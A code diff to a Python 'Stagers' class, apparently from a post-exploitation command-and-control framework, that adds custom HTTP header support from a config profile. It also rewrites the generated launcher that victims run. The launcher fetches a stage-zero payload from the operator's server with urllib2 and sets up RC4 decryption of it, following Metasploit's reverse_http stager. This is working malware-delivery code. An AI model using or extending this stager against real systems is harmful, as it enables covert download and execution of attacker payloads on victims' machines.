@@ -35,7 +35,14 @@ class Stagers:
         self.installPath = cur.fetchone()[0]
 
         cur.execute("SELECT default_profile FROM config")
-        self.userAgent = (cur.fetchone()[0]).split("|")[1]
+        res = cur.fetchone()[0]
+        self.userAgent = res.split("|")[1]
+        self.headers = {}
+        if len(res.split("|")) > 2:
+            headersList = res.split("|")[2:]
+            for l in headersList:
+                h = l.split(":")
+                self.headers[h[0]] = h[1]
 
         cur.close()
 
@@ -229,6 +236,9 @@ class Stagers:
         # get the launching stage0 URI
         stage0uri = self.generate_launcher_uri(server, encode, pivotServer, hop)
 
+        # add build headers dict and add US + additional headers, if any
+        headers = self.headers
+        headers.update({'User-Agent':userAgent})
         # adopted from MSF's python meterpreter staging
         #   https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/python/reverse_http.rb
 
@@ -253,12 +263,11 @@ class Stagers:
             p = "[!] Error setting LittleSnitch in stagger: " + str(e)
             print helpers.color(p, color="Yellow")
 
-        
-        launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
-        launcherBase += "UA='%s';" % (userAgent)
-        launcherBase += "o.addheaders=[('User-Agent',UA)];"
-        launcherBase += "a=o.open('%s').read();" % (stage0uri)
-        launcherBase += "key='%s';" % (stagingKey)
+
+        launcherBase += "o=urllib2.build_opener(urllib2.HTTPHandler())\n"
+        launcherBase += "req=urllib2.Request('%s', headers=%s)\n"%(stage0uri, str(self.headers))
+        launcherBase += "a=o.open(req).read()\n"
+        launcherBase += "\nkey='%s';" % (stagingKey)
         # RC4 decryption
         launcherBase += "S,j,out=range(256),0,[]\n"
         launcherBase += "for i in range(256):\n"
